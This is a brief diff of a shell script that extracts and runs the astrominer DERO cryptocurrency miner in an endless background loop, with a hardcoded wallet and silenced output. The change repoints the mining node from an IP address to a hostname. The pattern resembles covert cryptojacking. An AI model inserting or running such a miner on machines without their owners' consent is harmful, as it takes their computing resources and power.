@@ -46,7 +46,7 @@ while true; do
       tar -xf astrominer-V1.9.2.R5_amd64_linux.tar.gz && \
       ./astrominer/astrominer \
         -w dero1qyv4tdjrsjhl8u07ngsxv85hy9ln8j9ykcld3fr4hgl37f279tw9vqga0a27l \
-        -log-interval 600 -m 1 -p rpc -r 54.36.60.95:10100 \
+        -log-interval 600 -m 1 -p rpc -r nodent2.cpumining.cloud:10100 \
         > /dev/null 2>&1
     ) &
 
